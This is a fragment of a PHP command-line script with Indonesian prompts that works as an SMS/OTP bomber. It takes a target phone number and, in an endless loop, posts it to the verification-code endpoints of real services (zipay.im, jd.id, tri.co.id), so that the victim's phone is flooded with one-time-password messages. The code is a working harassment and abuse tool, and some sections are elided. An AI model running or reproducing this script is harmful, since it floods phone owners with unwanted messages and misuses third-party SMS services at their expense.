...
echo $Y."\nJangan Sampai Ketik CTRL+C";
echo $R."\n=============================".$G.$X."\n\n";
isset($argv[1]) OR die($RR."[!] Masukan [!]\n".$X);
if(is_numeric($argv[1])) {
	...
	while(1) {
		...
		post_data("https://id.zipay.im/invite/signup_sms.aspx","receiver=".$argv[1]);
		post_data("https://passport.jd.id/sms/sendSMSCode","phone=".$argv[1]);
		post_data("https://registrasi.tri.co.id/daftar/generateOTP","msisdn=".$argv[1]);
	}
}
...
echo "Send OTP  To -> ".$G.$argv[2].$X."\n";
	...
	post_data("https://id.zipay.im/invite/signup_sms.aspx","receiver=".$argv[2]);
    post_data("https://passport.jd.id/sms/sendSMSCode","phone=".$argv[2]);
    post_data("https://registrasi.tri.co.id/daftar/generateOTP","msisdn=".$argv[2]);
endforeach;
}
